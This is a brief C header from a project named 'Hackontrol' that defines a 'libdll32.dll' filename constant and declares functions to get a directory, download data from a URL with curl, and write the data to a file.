#pragma once

#include <khopandatastream.h>
#include <khopancurl.h>

#define FILE_LIBDLL32 L"libdll32.dll"

LPWSTR HackontrolGetDirectory();
BOOL HackontrolDownloadData(DataStream* const stream, LPCSTR const url, const BOOL curlInitialized, CURLcode* const outputCode);
BOOL HackontrolWriteFile(LPCWSTR const filePath, const DataStream* const stream);
